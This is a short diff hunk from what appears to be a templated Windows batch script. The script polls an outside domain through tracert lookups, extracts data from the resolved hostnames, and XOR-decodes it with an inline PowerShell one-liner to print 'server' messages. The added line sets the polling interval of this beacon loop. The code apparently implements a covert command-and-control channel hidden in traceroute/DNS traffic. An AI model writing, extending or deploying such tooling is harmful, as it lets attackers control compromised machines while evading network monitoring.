@@ -23,6 +23,7 @@ for /f "tokens=*" %%a in ('tracert -w 2000 rx.!Z! ^| findstr /i "!Z!" ^| findstr
 if "!R!"=="" goto N
 for /f %%d in ('powershell -nop -c "$k=@({{KEY_CSV}});$h='%R%';$b=for($i=0;$i-lt$h.length;$i+=2){[byte]([convert]::ToByte($h.Substring($i,2),16)-bxor$k[($i/2)%%4])};[text.encoding]::UTF8.GetString([byte[]]$b)"') do echo server: %%d
 :N
+timeout /t {{POLL_RATE}} /nobreak >nul
 goto L
 :Q
 tracert -h 1 -w 1000 end.!Z! >nul 2>&1
